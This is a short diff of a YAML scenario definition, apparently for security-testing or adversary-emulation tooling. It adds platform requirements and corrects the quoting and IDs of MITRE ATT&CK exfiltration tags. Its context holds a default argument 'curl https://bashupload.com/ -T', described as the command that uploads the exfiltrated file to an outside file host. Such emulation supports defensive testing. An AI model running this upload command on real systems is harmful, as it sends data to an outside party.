@@ -26,13 +26,18 @@ args:
     description: Curl command to be issued to upload the exfil file.
     default: "curl https://bashupload.com/ -T"
 
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+
 mitre:
   tactics:
-    - TA0010 Exfiltration
+    - "TA0010 Exfiltration"
   techniques:
-    - T1048 Exfiltration Over Alternative Protocol
+    - "T1048 Exfiltration Over Alternative Protocol"
   subtechniques:
-    - T1048.3 Exfiltration Over Unencrypted Non-C2 Protocol
+    - "T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol"
 
 steps:
   - name: aws-connector
